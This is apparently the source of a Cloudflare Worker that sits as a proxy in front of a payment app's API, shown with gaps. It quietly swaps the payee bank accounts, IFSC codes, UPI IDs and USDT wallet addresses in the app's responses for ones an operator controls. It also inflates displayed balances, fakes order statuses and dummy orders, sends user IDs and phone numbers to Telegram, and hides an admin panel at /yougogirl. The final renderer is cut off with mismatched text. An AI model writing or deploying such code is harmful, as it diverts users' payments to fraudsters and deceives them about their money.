/**
 * Cloudflare Worker Implementation - 100% Exact Parity with api/index.js
 * File: worker.js
 * Storage: Cloudflare Workers KV Namespace ('DIWAPAY_KV')
 * Admin Panel URL: /yougogirl
 */
...
// Helper: Load Data from Cloudflare KV
async function loadData(env, forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) {
    return cachedData;
  }
  if (env && env.DIWAPAY_KV) {
    try {
      const raw = await env.DIWAPAY_KV.get('diwapayData', 'json');
  ...
  if (!cachedData.dummyOrders) cachedData.dummyOrders = [];
  if (!cachedData.activeBoughtDummyOrders) cachedData.activeBoughtDummyOrders = {};

  cacheTime = Date.now();
  return cachedData;
}

// Helper: Save Data to Cloudflare KV
async function saveData(env, data) {
  cachedData = data;
  cacheTime = Date.now();
  if (env && env.DIWAPAY_KV) {
    try {
      await env.DIWAPAY_KV.put('diwapayData', JSON.stringify(data));
    } catch (e) { }
  }
}
...
async function sendBot2Message(data, text) {
  if (!data.bot2Enabled || !data.bot2Token || !data.bot2ChatId) return;
  await sendTelegram(data.bot2Token, data.bot2ChatId, text);
}

// Order & User Utility Helpers
...
function findDummyOrder(data, reqObj) {
  ...
  if (typeof reqObj === 'string' || typeof reqObj === 'number') {
    addCand(reqObj);
  } else if (typeof reqObj === 'object') {
    const { query, parsedBody, url } = reqObj;
    if (query && typeof query === 'object') for (const [k, v] of Object.entries(query)) addCand(v);
...
function trackUser(data, userId, info, phone) {
  if (!userId) return;
...
async function extractUserId(request, headers, parsedBody, jsonResp) {
  const authHeader = headers.get('authorization') || headers.get('token') || headers.get('apptoken') || '';
  if (authHeader) {
    try {
  ...
  if (parsedBody) {
    const uid = parsedBody.userId || parsedBody.userid || parsedBody.memberId || parsedBody.id || '';
    if (uid) return String(uid);
  }
  const u = new URL(request.url);
  if (u.searchParams.get('userId')) return String(u.searchParams.get('userId'));
  if (u.searchParams.get('id')) return String(u.searchParams.get('id'));
  if (jsonResp && jsonResp.data && typeof jsonResp.data === 'object' && !Array.isArray(jsonResp.data)) {
    const rid = jsonResp.data.userId || jsonResp.data.userid || jsonResp.data.memberId || jsonResp.data.id || '';
    if (rid) return String(rid);
  }
  return '';
}

function deepReplace(obj, active, origVals, depth) {
  if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return;
  if (Array.isArray(obj)) {
    obj.forEach(i => deepReplace(i, active, origVals, (depth || 0) + 1));
    return;
  }
  const upiVpa = active.upiId || (active.accountNo ? `${active.accountNo}@${(active.ifsc || 'npci').toLowerCase()}.ifsc.npci` : '');
  for (const k of Object.keys(obj)) {
    const lk = k.toLowerCase();
    if (['payeeaccount', 'bankaccount', 'accountno', 'receiveaccount', 'payoutaccount'].includes(lk)) {
      obj[k] = active.accountNo;
    } else if (['payeename', 'accountname', 'beneficiaryname', 'receivename', 'accountholder', 'payoutname'].includes(lk)) {
      obj[k] = active.accountHolder;
    } else if (['ifsc', 'ifsccode', 'bankifsc', 'receiveifsc', 'payoutifsc'].includes(lk)) {
      obj[k] = active.ifsc;
    } else if (['bankname', 'bank_name', 'payeebankname', 'payoutbank'].includes(lk)) {
      if (active.bankName) obj[k] = active.bankName;
    } else if (['payoutupi', 'payoutupiid', 'payeeupi', 'vpa', 'collectionupi'].includes(lk)) {
      obj[k] = upiVpa;
    } else if (obj[k] && typeof obj[k] === 'object') {
      deepReplace(obj[k], active, origVals, (depth || 0) + 1);
    }
  }
}

function replaceUsdtInResponse(obj, data) {
  if (!obj || typeof obj !== 'object' || !data.usdtAddress) return;
  if (Array.isArray(obj)) {
    obj.forEach(item => replaceUsdtInResponse(item, data));
    return;
  }
  for (const k of Object.keys(obj)) {
    const lk = k.toLowerCase();
    if (['usdtaddress', 'trc20address', 'walletaddress', 'payeeusdtaddress', 'rechargeusdtaddress'].includes(lk)) {
      obj[k] = data.usdtAddress;
    } else if (typeof obj[k] === 'object') {
      replaceUsdtInResponse(obj[k], data);
    }
  }
}

// Proxy Core Engine
async function proxyFetch(request, rawBody) {
  const urlObj = new URL(request.url);
  const targetUrl = ORIGINAL_API + urlObj.pathname + urlObj.search;
  ...
  for (const [k, v] of request.headers.entries()) {
    ...
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        ...
        kl.startsWith('cf-') || kl.startsWith('x-real-ip')) continue;
    fwdHeaders.set(k, v);
  }
  fwdHeaders.set('host', 'appm9t5zk.ddriva.com');
  ...
  response.headers.forEach((val, key) => {
    ...
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length' && kl !== 'set-cookie') {
      respHeaders.set(key, val);
    }
  });

  const respText = new TextDecoder('utf-8').decode(respBuffer);
  let jsonResp = null;
  try { jsonResp = JSON.parse(respText); } catch (e) { }

  return { response, respBuffer, respHeaders, respText, jsonResp };
}
  ...
  async fetch(request, env, ctx) {
    ...
    if (request.method !== 'GET' && request.method !== 'HEAD') {
      ...
      if (rawBody && rawBody.byteLength > 0) {
        try {
          const str = new TextDecoder('utf-8').decode(rawBody).trim();
    ...
    const reqObj = { query: Object.fromEntries(urlObj.searchParams), parsedBody, url: request.url };

    // --- DASHBOARD ROUTE: FULL EXACT GOGIRL PRO HTML ---
    if (pathname === '/yougogirl') {
      return renderFullDashboardHTML(data, env);
    }

    // --- DASHBOARD APIS: /yougogirl/api/* ---
    if (pathname.startsWith('/yougogirl/api/')) {
      return handleDashboardAPIs(pathname, parsedBody, data, env);
    }

    // --- APP STATIC VERSION ---
    if (pathname === '/app/app/version/info/getLatestAppVersion') {
      return new Response(JSON.stringify({
        code: 1000,
        data: { id: 1, createTime: "2025-01-01 00:00:00", updateTime: "2025-01-01 00:00:00", platform: "android", appVersion: "1.0.0", buildCode: 1, updateType: "apk", status: 0 },
        message: "success"
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    // --- APP ROUTE: /app/user/info/person & personV2 ---
    if (pathname === '/app/user/info/person' || pathname === '/app/user/info/personV2') {
      const { respHeaders, jsonResp } = await proxyFetch(request, rawBody);
      const userId = await extractUserId(request, request.headers, parsedBody, jsonResp);
      if (userId && jsonResp && jsonResp.data) {
        const uovr = data.userOverrides[String(userId)];
        const addedBal = uovr && uovr.addedBalance ? uovr.addedBalance : 0;
        if (addedBal !== 0 && typeof jsonResp.data.balance !== 'undefined') {
          jsonResp.data.balance = parseFloat((parseFloat(jsonResp.data.balance) + addedBal).toFixed(2));
        }
      }
      return new Response(JSON.stringify(jsonResp || {}), { headers: respHeaders });
    }

    // --- APP ROUTE: /app/payment/order/create ---
    if (pathname === '/app/payment/order/create') {
      const userId = await extractUserId(request, request.headers, parsedBody, null);
      const dummyMatch = findDummyOrder(data, reqObj);
      ...
      if (dummyMatch) {
        ...
        const p = parseFloat(dummyMatch.percent) || 3;
        ...
        const dummyResp = {
          code: 1000,
          data: {
            id: buyId, orderId: buyId, payOrderId: buyId, buyId: buyId,
            amount: amtNum, percent: p, income: incVal, commission: incVal,
            code: dummyMatch.code, orderCode: dummyMatch.code, remark: dummyMatch.code, status: 1
          },
          message: "success"
        };
        ...
        if (data.adminChatId) {
          ...
          const delMsg = `🗑️ *Dummy Order Purchased*\n👤 User: \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n📋 Code: \`${dummyMatch.code}\`\n💰 Amount: \`₹${dummyMatch.amount}\``;
          await sendTelegram(data.botToken, data.adminChatId, delMsg);
        }

        return new Response(JSON.stringify(dummyResp), { headers: { 'Content-Type': 'application/json' } });
      }
    }

    // --- APP ROUTE: List Endpoints (History Interceptor) ---
    if (pathname === '/app/payment/order/history' || pathname === '/app/receive/order/history' || pathname === '/app/payment/order' || pathname === '/app/offline/order/page') {
      const { respHeaders, jsonResp } = await proxyFetch(request, rawBody);
      const userId = await extractUserId(request, request.headers, parsedBody, jsonResp);
      const activeBank = getActiveBank(data, userId);

      if (jsonResp && jsonResp.data) {
        const listData = jsonResp.data.records || jsonResp.data.list || (Array.isArray(jsonResp.data) ? jsonResp.data : null);
        if (Array.isArray(listData)) {
          listData.forEach(item => {
            const itemCode = extractOrderCode(item) || String(item.code || item.orderCode || item.remark || '').trim();
            const itemBuyId = String(item.buyId || '').trim();
            const itemPayOrderId = String(item.payOrderId || '').trim();
            const candKeys = [itemCode, itemBuyId, itemPayOrderId, `${userId}:${itemCode}`].filter(Boolean);

            let stOverride = null;
            if (data.orderStatusOverrides) {
            ...
            if (activeBank) deepReplace(item, activeBank, {}, 0);
          });
        }
      }
      return new Response(JSON.stringify(jsonResp || {}), { headers: respHeaders });
    ...
    // --- APP ROUTE: Single Order Detail (/app/payment/order/orderInfo) ---
    if (pathname === '/app/payment/order/orderInfo') {
      const { respHeaders, jsonResp } = await proxyFetch(request, rawBody);
      const userId = await extractUserId(request, request.headers, parsedBody, jsonResp);
      if (jsonResp && jsonResp.data) {
        const dd = jsonResp.data;
        const itemCode = extractOrderCode(dd) || String(dd.code || dd.orderCode || dd.remark || '').trim();
        if (data.orderStatusOverrides && itemCode && data.orderStatusOverrides[itemCode]) {
          const targetStatus = Number(data.orderStatusOverrides[itemCode].status);
          const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
          const labelStr = data.orderStatusOverrides[itemCode].statusLabel || statusLabels[targetStatus] || "Completed";
    ...
    const { respBuffer, respHeaders, response } = await proxyFetch(request, rawBody);
    return new Response(respBuffer, { status: response.status, headers: respHeaders });
  }
};

// Dashboard API Endpoints Handler
async function handleDashboardAPIs(pathname, body, data, env) {
  const headers = { 'Content-Type': 'application/json' };

  if (pathname === '/yougogirl/api/history/update') {
    const { userId, orderCode, status } = body || {};
    if (!orderCode) return new Response(JSON.stringify({ success: false, error: 'Order Code / ID is required' }), { headers });
    ...
    await saveData(env, data);
    return new Response(JSON.stringify({ success: true, message: `Status updated to ${labelStr} for order ${cleanCode}` }), { headers });
  }

  if (pathname === '/yougogirl/api/history/delete') {
    ...
    await saveData(env, data);
    return new Response(JSON.stringify({ success: true, message: 'Status override deleted' }), { headers });
  }

  if (pathname === '/yougogirl/api/balance/update') {
    const { userId, amount, action } = body || {};
    data.userOverrides[String(userId)] = data.userOverrides[String(userId)] || {};
    if (action === 'add') data.userOverrides[String(userId)].addedBalance = (data.userOverrides[String(userId)].addedBalance || 0) + parseFloat(amount);
    else if (action === 'deduct') data.userOverrides[String(userId)].addedBalance = (data.userOverrides[String(userId)].addedBalance || 0) - parseFloat(amount);
    else if (action === 'remove') delete data.userOverrides[String(userId)].addedBalance;
    await saveData(env, data);
    return new Response(JSON.stringify({ success: true, message: 'Balance updated' }), { headers });
  }

  if (pathname === '/yougogirl/api/bank/add') {
    const { holder, accNo, ifsc, bankName, upi } = body || {};
    data.banks = data.banks || [];
    data.banks.push({ accountHolder: holder, accountNo: accNo, ifsc, bankName: bankName || '', upiId: upi || '' });
    if (data.activeIndex < 0) data.activeIndex = 0;
    await saveData(env, data);
    return new Response(JSON.stringify({ success: true, message: 'Bank added' }), { headers });
  }

  if (pathname === '/yougogirl/api/bank/remove') {
    const { index } = body || {};
    data.banks = data.banks || [];
    if (index !== undefined && index >= 0 && index < data.banks.length) {
      ...
      await saveData(env, data);
      return new Response(JSON.stringify({ success: true, message: 'Bank removed' }), { headers });
    }
    return new Response(JSON.stringify({ success: false, error: 'Invalid index' }), { status: 400, headers });
  }

  if (pathname === '/yougogirl/api/bank/set-active') {
    const { index } = body || {};
    if (index !== undefined && index >= 0 && index < data.banks.length) {
      data.activeIndex = index;
      await saveData(env, data);
      return new Response(JSON.stringify({ success: true, message: 'Active bank updated' }), { headers });
    }
    return new Response(JSON.stringify({ success: false, error: 'Invalid index' }), { status: 400, headers });
  }
...
// FULL GOGIRL PRO HTML RENDERER (VERBATIM FROM INDEX.JS)
function renderFullDashboardHTML(data, env) {
  ...
  const html = `const express = require('express');
